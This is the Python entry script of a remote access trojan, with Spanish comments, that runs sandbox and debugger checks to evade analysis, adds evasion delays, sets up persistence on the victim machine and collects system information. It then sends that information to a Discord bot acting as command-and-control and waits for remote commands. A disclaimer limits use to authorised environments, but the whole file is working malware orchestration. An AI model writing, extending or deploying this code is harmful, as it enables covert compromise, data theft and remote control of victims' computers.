#!/usr/bin/env python3
"""
RAT - Cliente Víctima
Solo para uso en entornos controlados con autorización explícita
"""

import os
import sys
import asyncio
import argparse

# Añadir módulos al path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.environment import EnvironmentChecker, EvasionTechniques
from modules.persistence import PersistenceManager
from modules.intelligence import IntelligenceCollector
from modules.discord_c2 import DiscordC2Client
from modules.commands import CommandExecutor


class RATClient:
    """
    Cliente RAT principal que orquesta todos los módulos
    """
    
    def __init__(self, bot_token, channel_id):
        self.session_id = self._generate_session_id()
        self.env_checker = EnvironmentChecker()
        self.persistence = PersistenceManager()
        self.intelligence = IntelligenceCollector()
        self.c2 = DiscordC2Client(bot_token, channel_id)
        self.executor = CommandExecutor(self.c2)
        
        self.c2.session_id = self.session_id
    
    def _generate_session_id(self):
        """Genera ID único de sesión"""
        import uuid
        return str(uuid.uuid4())[:8].upper()
    
    async def run(self):
        """Loop principal del RAT"""
        print(f"[+] Iniciando sesión: {self.session_id}")
        
        # Fase 1: Verificación de entorno
        print("[*] Verificando entorno...")
        self.env_checker.check_sandbox_indicators()
        self.env_checker.check_debugger()
        
        if self.env_checker.should_exit():
            print("[-] Entorno de análisis detectado. Saliendo.")
            return
        
        # Delay de evasión
        delay = EvasionTechniques.delay_execution(5, 15)
        print(f"[*] Delay de evasión: {delay}s")
        
        # Fase 2: Establecer persistencia
        print("[*] Estableciendo persistencia...")
        self.persistence.establish_all()
        
        # Fase 3: Recopilar inteligencia
        print("[*] Recopilando información...")
        system_info = self.intelligence.collect_all()
        
        # Fase 4: Conectar con C2
        print("[*] Conectando con C2 Discord...")
        
        # Iniciar cliente Discord en task separada
        c2_task = asyncio.create_task(self.c2.client.start(self.c2.bot_token))
        
        # Esperar conexión
        timeout = 0
        while not self.c2.connected and timeout < 30:
            await asyncio.sleep(1)
            timeout += 1
        
        if not self.c2.connected:
            print("[-] No se pudo conectar al C2")
            return
        
        print("[+] Conectado al C2")
        
        # Enviar información inicial
        await self.c2.send_system_info(system_info)
        
        # Fase 5: Loop de comandos
        print("[+] Entrando en modo de escucha...")
        await self.executor.process_queue()


def main():
    parser = argparse.ArgumentParser(
        description='RAT - Cliente de acceso remoto'
    )
    parser.add_argument(
        '--token', 
        required=True,
        help='Token del bot de Discord'
    )
    parser.add_argument(
        '--channel', 
        required=True,
        help='ID del canal de Discord'
    )
    parser.add_argument(
        '--allow-sandbox',
        action='store_true',
        help='Permitir ejecución en sandbox (para testing)'
    )
    
    args = parser.parse_args()
    
    if args.allow_sandbox:
        os.environ['RAT_ALLOW_SANDBOX'] = '1'
    
    # Iniciar cliente
    client = RATClient(args.token, args.channel)
    
    try:
        asyncio.run(client.run())
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por usuario")
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == '__main__':
    main()